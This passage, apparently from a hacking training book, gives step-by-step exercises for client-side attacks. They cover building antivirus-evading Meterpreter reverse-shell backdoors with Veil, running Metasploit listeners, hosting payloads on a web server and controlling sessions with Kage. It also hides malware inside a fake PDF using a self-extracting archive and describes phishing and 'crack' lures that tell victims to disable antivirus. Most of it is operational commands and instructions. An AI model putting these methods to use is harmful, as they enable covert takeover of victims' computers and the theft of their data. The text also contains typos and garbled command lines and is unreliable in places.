and social Engineering to convince or deceive the client to click on
a file or link sent to him. In this section we are going to use Veil-
Evasion framework to generate payload executable that can bypass
common Antivirus software. Viel Evasion is an open source
framework that located at https://www.veil-framework.com/
S_E_Oblako
6. Gaining Access (Client Site Attacks)
Client Site attacks is used if Server-side attacks are failed
Require user interaction
Social Engineering can be useful
Information gathering is vital
6.1. Using Veil Evasion Framework
Veil-Evasion is a tool designed for penetration testers and red teams to
simulate bypasses of common Antivirus products. Tools like this are of high
value to offensive security professionals, as they can be used to emulate a
more persistent attacker who will try to bypass an Antivirus system through
trial and error. Without a tool such as Veil-Evasion, offensive security
engagements would take longer time.
Veil-Evasion can work on existing executables, or simply create a wide range
of payloads with shellcode added to them. Most cases use a shellcode-based
method, as the resulting payload has a better chance of evading Antivirus
systems.
Considering that a tool like this is used by professional organizations to
simulate an attack by adversaries, it would make sense to allow a user to
automate the generation of a payload from a central location. This allows it to
be integrated into attack workflows, which lets offensive security
professionals work more efficiently.
In Summary:
Veil is a framework for generating backdoors that is not detected by
Anti-Virus.
Backdoor is a file that is when executed in a computer it will give a
full access to that computer.
Veil framework is located at Github
The steps to do Backdoor attack:
Create the backdoor file using Veil.
Checking the file against Anti-Virus.
Listening to connection using Metasploit.

6.2. Installing Veil 3.1 In Kali Linux
Exercise 28: Client-Side Attacks – Installing Veil Evasion
1. Go to Veil page at Github https://github.com/Veil-Framework/Veil
2. copy the link from Github
3. open terminal in Kali
4. go to /opt directory and type:
# git clone https://github.com/Veil-Framework/Veil.git
5. now go to Veil directory
S_E_Oblako
#cd Veil
6. Go to config directory to run setup file in a silent mode (installing
default configurations)
#./setup.sh --silent --force
7. After Veil completely installed close the terminal and open new
terminal and start Veil
#cd Downloads/Veil/Veil/
#./Veil.py
As you can see the green commands that we can run in Vial.
8. Type
#list
Evasion: is the program which generate backdoors
Ordnance: The program that generate the payload that used by Evasion, The
payload is a part of the code that allow us to control the target machine like
S_E_Oblako
reverse connection, download or upload files from/to target machine.
Exercise 29: Creating Backdoor malware
1. to start using Evasion just type Veil>: use 1
2. #list command will show us all the loaded payloads
S_E_Oblako
Meterpreter is a dynamically extensible payload that uses in-memory dll
injection extended over the network at runtime. Because this payload runs
only in memory, it allow us to do anything untraceable, no files installed in
the target computer hard disk and we can use this payload to connect to other
target computer in the network and do anything the normal user can do in his
computer, it will give full control like installing keylogger inside the machine
and other malwares, download files, run programs ..
3. Use Evasion payload 7 which is reverse TCP connection:
Veil/Evasion>: use 7
S_E_Oblako
4. Configure the payload by entering LHOST (Kali Machine IP
S_E_Oblako
address) and if you like to change the port, change the value of
LPORT.
5. Type: generate to generate the payload then, give a name to the
new windows malware created.
6. The File will be stored /var/lib/veil/output/compiled/revtcp23.exe
7. This file is the malware that when installed in Windows 10 machine
and not detected by Windows defender or other Antivirus software
,it will create a backdoor connection from the victim to the attacker
machine which its IP address provided as part of the file creation (
Kali ) ,also The port is configured because the Attacker machine
need to listen to that port in order to make the connection.

6.3. How Anti-Malware work
Anti-malware/Anti-virus programs scan for malware using a database of
known malware definitions (also called signatures). These definitions tell
what the malware does and how to recognize it. If the anti-malware program
detects a file that matches the definition, it will flag it as potential malware.
Heuristics
Another way Anti-Malware (AM) detects bad software is a form of analysis
called heuristics. An alternative to database scanning, heuristic analysis
allows anti-malware programs to detect threats that were not previously
discovered. Heuristics identifies malware by behaviors and characteristics,
instead of comparing against a list of known malwares.
For example, if an application is programmed to remove important system
files, the anti-malware software may flag it as malware. Heuristic analysis
can sometimes result in “false positives,” or programs flagged as malware
that are legitimate.
Sandboxing
A third way Anti-Malware software can find malware is by running a
program it suspects to be malicious in a sandbox, which is a protected space
on the computer, similar to a virtual machine within the OS. The suspected
program believes it has full access to the computer when, in fact, it is running
in an enclosed space while the anti-malware monitors its behavior. If it
demonstrates malicious behavior, the anti-malware will terminate it.
Otherwise, the program can execute outside the sandbox. However, some
forms of malware are smart enough to know when they are running in a
sandbox and will stay on their best behavior…until they are allowed free
access to the computer.
Removal
The anti-malware does not just flag malware. Once malware has been found
on a system, it needs to be removed. Many threats can be deleted by the anti-
malware program as soon as they are detected. However, some malware is
designed to cause further damage to computer if it is removed. If the anti-
malware suspects this is the case, it will usually quarantine the file in a safe
area of computer storage. Basically, the anti-malware puts the malware in a
timeout. Quarantining a malicious file prevents it from causing harm and
S_E_Oblako
allows you to remove the file manually without damaging your computer.
Checking if the generated file is detected by AV
There are some websites that scan the software against well-known anti-
malware detection software, some these sites like virus total will take the
signature of the file that you upload and will update the anti-malware
software vendors. The free websites that do not share uploaded files do not
stay live for a long time.
There are websites that review and rank these websites and show if the
website shares the uploaded file with antivirus vendors or not. you need to
search Google for “Online Multi Engine Antivirus scanners”
Here is an example:
S_E_Oblako
These sites will ask you to upload your file, then they scan it and give you the
results.
S_E_Oblako
6.4. Listening to incoming connectios
Exercise 30: Setup Hacker machine to listen to Incoming
connection
Since the backdoor that we created in the previous exercise uses a reverse
payload, we need to setup Kali to listen for incoming connection using
Metasploit framework and configuring it with the port that it should listen to.
1. open new terminal windows in Kali and type
#msfconsole
S_E_Oblako
2. use a module in Metasploit called exploit/multi/handler that
allow us to listen to incoming connections from our payload file.
3. Setup the parameters of the exploit as shown in the screenshot
below
4. to start listening type
#exploit to start
Notes
S_E_Oblako
If you get error “failed to bind to” either change the port in
the Veil file created and repeat the Listening steps in Kali or
use the below procedure to see what process using the port
8080.
Use the following commands in Kali to determine which
process using the port 8080
#netstat -a : will show all connections to the machine.
#lsof -i: to check specific port and which services
is using it.
You can Kill the process that is using the port 8080
S_E_Oblako
6.5. Delivery Method
There are many ways to deliver the Malware to victim’s machines, the
method depends on the attacker intention, and if he is targeting specific users
or any user. the attacker will choose the delivery method after gathering
information about the victim and understanding how to exploit the victim
using social Engineering and other means. The delivery method could be
through a phishing email that have a link to a malicious website or
attachment of the malware. For example people looking for free software or
crack to a software license, attacker can exploit their desire to not paying for
a software license and have the malware named as a crack engine available to
download, even the attacker provide instructions to users about how to
disable Anti-malware software claiming that anti-malware software will
block the crack from working. Also, Malware can be delivered in a form of
Word Document or imbedded inside an image or a PDF file.
Exercise 31: Malware Basic Delivery Method
Basically, we are going to put the backdoor in kali web server and download
it from the target machine just to make sure that file works.
1. Copy backdoor file to Kali web server
2. Go to Kali web server folder located at var/www/html and create
new folder to have the malware files stored under that folder and
available to download.
3. Copy the Veil file created to that location
#mkdir malware
#cp /var/lib/output/compiled/revtcp23.exe /var/www/html/maleware
4. If you already have index.html file under html folder then create a
new folder under html folder and put the vail created file under it.
S_E_Oblako
5. Start web server at Kali
#service apache2 start
6. start Windows machine from VBOX and open Browser and connect
to Kali website then go to http://Kali_ip/maleware
7. Click on the file revtcp23.exe and choose to run it anyway.
8. Windows Defender may detect the file and delete it, for testing
purposes disable Windows Defender.
9. check Kali and you should see one session opened with the
Windows Machine.
10. when you get meterpreter session that mean that the backdoor
successfully made reverse connection to Kali machine.
11. In Kali meterpreter session type >sysinfo
12. Type >help to see available commands and functions that you
can run on the victim machine.
S_E_Oblako
Notes
I run the file manually in Windows machine just to prove
that the file actually works .
Most likely the AV will detect the file and delete it or stop
it from working so sometimes you may need to stop the
AV in Windows machine just to make sure the file works.
Most users who has outdated AV will not detect the file.
To disable Windows Defender: Go to Run then type
egpedit.msc and go to Administrative Templates →
Windows Components → Windows Defender
Antivirus and turn off Windows Defender
Basically bypassing Antivirus programs or any other
security layer is like a game of cat and mouse, so
backdoors might start getting detected at some stage, then
the developers release new update, this will allow you to
generate undetectable backdoors, then AV programs
release an update which will make backdoors detectable.
Make sure that Veil or any other tool you are using to
generate the backdoor is up to date.
S_E_Oblako
Exercise 32: Creating Encrypted backdoor
Encrypted backdoor will make the communication between the victim
machine and the attack machine is encrypted and no one can see the type of
traffic uploaded or download to/from the victim machine.
Veil can create encrypted backdoor using reverse_https connection and Kali
Metasploit can use same reverse_https to listen and decrypt the packets
1. To create Encrypted backdoor
2. Start Veil
3. use option 15 rev_https
S_E_Oblako
4. Set the options of the rev_hhtps
S_E_Oblako
5. The PROCESSORS and SLEEP parameters will not affect the file,
but they will help in the Antivirus evasion as they change the file
signature
S_E_Oblako
6. Copy the generated file to the /var/www/html/maleware to make
the file available for download through Kali website
7. In Kali start the listener through msfconsole :
#msfconsole
msf5> set exploit/multi/handler
msf5>set payload windows/meterpreter/reverse_https
msf5>set LHOST 10.0.2.23
msf5>set LPORT 4445
S_E_Oblako
msf5>exploit
8. From Windows 10 machine access the Kali website and download
the file revhttps.exe and choose to run anyway when Windows give
you warning
9. Look at Kali Listener, you can see the reverse connection is
established and using https which mean the connection is encrypted
10. In meterpreter session type meterpreter>shell to get Windows
S_E_Oblako
shell

6.6. Control hacked Devices with Kage Tool
Kage is a tool designed for Metasploit RPC server that interact with
Meterpreter sessions and generate payloads that support Windows
Meterpreter and Android Meterpreter.Kage makes Metasploit setup easier
through GUI configuration of creating backdoor malware, setup Metasploit
listener and many other Metasploit functions
Exercise 33: Using Metasploit GUI Kage
1. In Kali open browser and go to https://github.com/Zerx0r/kage
2. Download Kage by clicking on “you can install Kage binaries from
here” at the same page”.
S_E_Oblako
3. Then download the Linux version Kage.0.1.1-
beta_linux.Applmage
4. Navigate to the downloaded file from Kali terminal
5. Change the file to executable and run it from the terminal.
#chmod +x Kage.0.1.1.-beta_linux.AppImage
S_E_Oblako
#./Kage.0.1.1.-beta_linux.AppImage &
6. Manually start Metasploit from terminal then load msgrpc
#msfconsole
msf5>load msgrpc
S_E_Oblako
7. Copy the password provided by msgrpc , then go to Kage and enter
the username msf end enter the password and uncheck “over https”
then click connect.
8. After clicking Connect, the following windows will appear
S_E_Oblako
9. Creating a backdoor with Kage is easy
10. Go to the folder Kage under root and rename the file to .exe
S_E_Oblako
11. Create a listener using Kage
12. Copy the backdoor to /var/www/html/maleware
13. Start windows machine and go to the Kali website and download
the kagetest.exe backdoor and run it anyway
14. Go back to Kali and open kage and click on sessions
15. Click on interact then click on Screenshot button

S_E_Oblako
Notes
Kage is still new software at the time of making this book
(beta), some of the features like having camera stream or
microphone are not working. However, it is very useful
software allowing easy management of sessions and control of
hacked machines.
Kage can list and control sessions that created manually by
direct command msfvenom or Veil backdoors.
Normally backdoors generated through msfvenom is easily
detected by antivirus programs.
You can interact manually with Kage session from terminal by
listing the sessions from msfconsole.

6.7. Embedding Malware into PDF and JPG files
PDF can be embedded with malware in two ways, one is using PDF
vulnerability if there is one exists, and then using exploit to use that
vulnerability, Metasploit has two exploit for old PDF vulnerabilities that can
work in Windows XP and Adobe 9. These vulnerabilities do not work in
Windows 8 and up, with the latest Adobe readers. The other way does not
depend on vulnerabilities on the Adobe of PDF file itself, rather combining
malware file with PDF file and giving then a name as a PDF file. Hackers
will Depend on deceiving the victim to run the combined files thinking that
he is running a PDF file. When the two files run the PDF will be opened in
the desktop of the victim machine as normal but at the same time the malware
will create a backdoor to hacker machine. Similarly, we can replace the PDF
file with image JPG file and combining it with malware.
Exercise 34 Embedding Malware into PDF file
1. Use the same malware file that we created in previous exercises or
generate a new file.
2. We are going to use Windows machine to do the file joining (PDF +
Malware)
3. Start Windows 10 Virtual machine
4. Use the malware file we used in Kage exercise (kagetest.exe)
S_E_Oblako
5. Move the file to Windows Desktop
6. Download Adobe PDF icon image from the internet.
7. Create ico file for the PDF icon image (ico is a thump of an image).
8. Go to https://icoconvert.com ( or any other ico converter website)
S_E_Oblako
9. Convert ICO and download to desktop
10. Have a real PDF file that will be used to hide the malware.
11. In the windows desktop, you should have the following files.
S_E_Oblako
12. Highlight Malware and PDF file and add them to archive
13. Give the archive a name and choose create SFX archive then click
on advanced
S_E_Oblako
14. Click on SFX options -> update and choose Extract and update
files and overwrite all files (see screenshot)
S_E_Oblako
15. Then click on Setup tab and add the malware name ended with .exe
and followed by Pdf file name ended with pdf
S_E_Oblako
16. Click on Modes and click on hide start dialog
S_E_Oblako
17. Then click on Text and icon tab, in the bottom load SFX icon from
file and choose the ico file that we created.
S_E_Oblako
18. OK then OK and final file will be generated.
